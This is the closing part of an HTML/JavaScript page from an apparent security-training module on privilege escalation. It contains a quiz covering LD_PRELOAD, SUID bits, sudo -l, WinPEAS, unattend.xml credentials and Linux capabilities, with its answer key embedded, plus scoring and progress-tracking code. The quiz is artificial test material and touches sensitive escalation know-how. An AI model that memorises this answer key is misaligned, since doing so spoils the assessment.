                question: "What is the Linux equivalent of DLL hijacking?",
                options: [
                    "Library injection",
                    "LD_PRELOAD",
                    "SO hijacking",
                    "Dylib hijacking"
                ],
                correct: 1
            },
            {
                question: "Which tool is part of the PEASS-ng suite for Windows enumeration?",
                options: [
                    "WindowsEnum",
                    "WinChecker",
                    "WinPEAS",
                    "WinPriv"
                ],
                correct: 2
            },
            {
                question: "What permission value represents SUID in octal notation?",
                options: [
                    "2000",
                    "4000",
                    "6000",
                    "1000"
                ],
                correct: 1
            },
            {
                question: "Which file commonly contains credentials from Windows unattended installations?",
                options: [
                    "install.xml",
                    "unattend.xml",
                    "setup.xml",
                    "config.xml"
                ],
                correct: 1
            },
            {
                question: "What command checks sudo permissions for the current user in Linux?",
                options: [
                    "sudo --check",
                    "sudo -v",
                    "sudo -l",
                    "sudo --list-perms"
                ],
                correct: 2
            },
            {
                question: "Which macOS technique is equivalent to Windows DLL hijacking?",
                options: [
                    "Framework hijacking",
                    "Dylib hijacking",
                    "SO injection",
                    "Bundle hijacking"
                ],
                correct: 1
            },
            {
                question: "What is the primary defense against privilege escalation?",
                options: [
                    "Antivirus software",
                    "Firewall rules",
                    "Principle of Least Privilege",
                    "Network segmentation"
                ],
                correct: 2
            },
            {
                question: "Which Linux capability allows a binary to change UID?",
                options: [
                    "cap_setgid",
                    "cap_setuid",
                    "cap_chown",
                    "cap_admin"
                ],
                correct: 1
            }
        ];

        // Generate Quiz
        function generateQuiz() {
            const container = document.getElementById('quizContainer');
            container.innerHTML = '';

            quizQuestions.forEach((q, index) => {
                const questionDiv = document.createElement('div');
                questionDiv.className = 'question';
                questionDiv.innerHTML = `
                    <h3>Question ${index + 1}</h3>
                    <p style="color: var(--text); margin-bottom: 15px;">${q.question}</p>
                    <div class="options" data-question="${index}">
                        ${q.options.map((option, optIndex) => `
                            <div class="option" data-option="${optIndex}" onclick="selectOption(${index}, ${optIndex})">
                                ${option}
                            </div>
                        `).join('')}
                    </div>
                `;
                container.appendChild(questionDiv);
            });
        }

        // Select Option
        function selectOption(questionIndex, optionIndex) {
            const optionsContainer = document.querySelector(`[data-question="${questionIndex}"]`);

            // Remove selected from all options in this question
            optionsContainer.querySelectorAll('.option').forEach(opt => {
                opt.classList.remove('selected');
            });

            // Add selected to clicked option
            event.target.classList.add('selected');
        }

        // Submit Quiz
        function submitQuiz() {
            let correct = 0;
            const totalQuestions = quizQuestions.length;

            quizQuestions.forEach((q, index) => {
                const optionsContainer = document.querySelector(`[data-question="${index}"]`);
                const selected = optionsContainer.querySelector('.option.selected');

                if (selected) {
                    const selectedIndex = parseInt(selected.getAttribute('data-option'));

                    if (selectedIndex === q.correct) {
                        selected.classList.add('correct');
                        correct++;
                    } else {
                        selected.classList.add('incorrect');
                        // Highlight correct answer
                        optionsContainer.querySelector(`[data-option="${q.correct}"]`).classList.add('correct');
                    }
                } else {
                    // Show correct answer if nothing selected
                    optionsContainer.querySelector(`[data-option="${q.correct}"]`).classList.add('correct');
                }
            });

            const percentage = (correct / totalQuestions) * 100;
            const passed = percentage >= 80;

            const resultsDiv = document.getElementById('quizResults');
            resultsDiv.innerHTML = `
                <div class="results">
                    <h2>${passed ? 'Assessment Passed!' : 'Assessment Incomplete'}</h2>
                    <p style="font-size: 1.3em; margin: 20px 0;">Score: ${correct}/${totalQuestions} (${percentage.toFixed(1)}%)</p>
                    ${passed ? `
                        <div class="xp-reward">+80 XP</div>
                        <p style="color: var(--success); font-size: 1.2em;">You've mastered Privilege Escalation techniques!</p>
                    ` : `
                        <p style="color: var(--warning); font-size: 1.1em;">Review the material and try again. You need 80% to pass.</p>
                    `}
                </div>
            `;

            if (passed) {
                localStorage.setItem('hexworth_privesc_completed', 'true');
                localStorage.setItem('hexworth_privesc_score', correct);
                updateProgress();
            }

            // Disable submit button
            document.getElementById('submitQuiz').disabled = true;
            document.getElementById('submitQuiz').textContent = 'Assessment Submitted';

            // Scroll to results
            resultsDiv.scrollIntoView({ behavior: 'smooth' });
        }

        // Progress Tracking
        function updateProgress() {
            const sections = ['overview', 'visualizer', 'techniques', 'suid-finder', 'path-checker', 'tools', 'defense', 'quiz'];
            const visited = [];

            sections.forEach(section => {
                if (localStorage.getItem(`hexworth_privesc_visited_${section}`)) {
                    visited.push(section);
                }
            });

            // Mark current section as visited
            const activeSection = document.querySelector('.section.active');
            if (activeSection) {
                const sectionId = activeSection.id;
                localStorage.setItem(`hexworth_privesc_visited_${sectionId}`, 'true');
                if (!visited.includes(sectionId)) {
                    visited.push(sectionId);
                }
            }

            // Add checklist progress
            const totalChecklist = document.querySelectorAll('.checklist-item').length;
            const checkedItems = document.querySelectorAll('.checklist-item.checked').length;
            const checklistProgress = totalChecklist > 0 ? (checkedItems / totalChecklist) * 15 : 0;

            // Add quiz completion
            const quizCompleted = localStorage.getItem('hexworth_privesc_completed') === 'true' ? 25 : 0;

            const sectionProgress = (visited.length / sections.length) * 60;
            const totalProgress = Math.min(sectionProgress + checklistProgress + quizCompleted, 100);

            const progressFill = document.getElementById('progressFill');
            progressFill.style.width = totalProgress + '%';
            progressFill.textContent = Math.round(totalProgress) + '%';
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            generateQuiz();
            loadChecklistState();
            updateProgress();

            // Load last visited section
            const lastSection = localStorage.getItem('hexworth_privesc_section');
            if (lastSection && document.getElementById(lastSection)) {
                document.querySelector('.section.active')?.classList.remove('active');
                document.getElementById(lastSection).classList.add('active');

                document.querySelectorAll('.nav-btn').forEach(btn => {
                    btn.classList.remove('active');
                    if (btn.textContent.toLowerCase().includes(lastSection.split('-')[0])) {
                        btn.classList.add('active');
                    }
                });
            }
        });
    </script>
<script src="../../components/FluxCapacitor.js"></script>
</body>
</html>